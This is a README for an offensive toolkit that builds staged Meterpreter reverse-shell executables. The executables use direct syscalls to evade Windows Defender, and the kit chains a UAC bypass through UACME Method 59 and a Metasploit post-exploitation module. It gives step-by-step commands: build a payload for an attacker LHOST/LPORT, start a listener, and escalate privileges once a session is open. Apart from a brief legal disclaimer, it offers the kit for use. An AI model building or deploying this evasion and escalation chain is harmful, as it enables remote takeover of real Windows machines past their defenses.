# Acheron Payload Research Toolkit

A research-oriented toolkit for generating staged Meterpreter payloads using **Acheron direct syscalls** for Windows Defender evasion research, featuring **UAC bypass analysis (Method 59 - Debug Object / PPID Spoofing)** via Akagi (UACME).

> **⚠️ Legal Disclaimer**: This toolkit is for **authorized security testing and research only**. Unauthorized access to computer systems is illegal.

## Architecture
- **Acheron Syscalls**: Bypasses userland API hooking (`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`).
- **Staged Payload**: `windows/x64/meterpreter/reverse_tcp` (~511 bytes).
- **UAC Bypass**: Analysis chain via Akagi (Method 59).
- **Automation**: Metasploit post-exploitation module included.

## Prerequisites
- Kali Linux (x86_64)
- `go` (>= 1.25), `metasploit-framework`, `shellcheck`
- `akagi.exe` (UACME compiled binary) placed in `bin/akagi.exe`

## Setup & Reliability
This toolkit uses Go modules for deterministic builds. Dependencies are managed via `go.mod` and `go.sum` to ensure reproducibility.

1. **Clone the repository**:
   ```bash
   git clone https://github.com/hgguy/acheron-toolkit.git
   cd acheron-toolkit
   ```

2. **Add Akagi**:
   Place your compiled `akagi.exe` (UACME Method 59) into the `bin/` directory:
   ```bash
   ls -l bin/akagi.exe
   ```

## Usage

### 1. Generate Payload
Use the direct CLI for automated build:
```bash
./acherongen.sh <LHOST> <LPORT>
```
Output: `acheron_<LHOST>_<LPORT>.exe` (PE32+ x64).

### 2. Start Listener
Start the Metasploit listener with auto-configured bypass parameters:
```bash
./toolkit.sh
# Select option 2) Start Listener
```

### 3. UAC Bypass (Analysis)
Once a meterpreter session is established:
```bash
use post/windows/escalate/bypassuac_method59
set SESSION <id>
set LHOST <ip>
set LPORT <port>
run
```

## Refactoring Notes
- **Reliability**: Dependencies are now locked via `go.mod`.
- **Portability**: Path resolution for `akagi.exe` is now absolute, preventing execution failures.
- **Cleanup**: CI/CD and obsolete C wrappers removed; build artifacts are managed automatically.
